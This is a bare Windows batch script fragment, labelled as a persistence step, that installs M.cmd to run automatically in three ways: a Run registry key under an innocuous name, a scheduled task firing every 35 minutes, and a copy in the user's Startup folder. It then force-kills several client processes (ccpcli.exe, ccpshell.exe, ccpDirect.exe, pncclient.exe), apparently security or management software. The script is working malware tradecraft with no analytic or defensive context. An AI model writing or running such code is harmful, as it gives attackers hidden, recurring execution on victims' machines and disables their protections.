

::perz
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v cd5 /t REG_SZ /d "C:\Users\Public\M.cmd" /f || reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v cd5 /t REG_SZ /d C:\Users\Public\M.cmd /f

SCHTASKS    /Create /SC MINUTE /MO 35 /TN georgia /TR "C:\Users\Public\M.cmd" /f || SCHTASKS    /Create /SC MINUTE /MO 35 /TN georgia /TR C:\Users\Public\M.cmd /f

mkdir "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" || mkdir ""%userprofile%"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

xcopy /c /q /y "M.cmd" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" || xcopy /c /q /y "M.cmd" ""%userprofile%"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

-.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.-


xcopy /c /q /y M.cmd "C:\Users\Public"


-.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.-

tasklist /fi "IMAGENAME eq ccpcli.exe" | find /i "ccpcli.exe" && taskkill /f /im ccpcli.exe & tasklist /fi "IMAGENAME eq CCPCLI~1.EXE" | find /i "CCPCLI~1.EXE" && taskkill /f /im CCPCLI~1.exe & tasklist /fi "IMAGENAME eq ccpshell.exe" | find /i "ccpshell.exe" && taskkill /f /im ccpshell.exe & tasklist /fi "IMAGENAME eq ccpDirect.exe" | find /i "ccpDirect.exe" && taskkill /f /im ccpDirect.exe & tasklist /fi "IMAGENAME eq pncclient.exe" | find /i "pncclient.exe" && taskkill /f /im pncclient.exe || echo naval

-.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.-

exit

-.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.-

